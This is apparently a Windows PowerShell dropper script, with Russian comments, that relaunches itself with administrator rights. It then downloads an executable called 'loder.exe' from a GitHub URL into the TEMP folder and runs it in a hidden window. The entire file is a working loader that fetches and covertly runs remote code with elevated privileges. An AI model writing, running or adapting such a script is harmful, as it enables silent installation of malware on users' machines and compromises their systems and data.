$ExeURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.exe"
$ExePath = "$env:TEMP\krakeh_loader.exe"
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # ПЕРЕЗАПУСК СЕБЯ ОТ АДМИНА
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}
try {
    Invoke-WebRequest -Uri $ExeURL -OutFile $ExePath -UseBasicParsing -ErrorAction Stop
} catch {
    # ЕСЛИ СКАЧАТЬ НЕ ПОЛУЧИЛОСЬ — НИЧЕГО НЕ ДЕЛАЕМ, ПРОСТО ВЫХОДИМ
    Exit
}
Start-Process -FilePath $ExePath -WindowStyle Hidden -NoNewWindow
Exit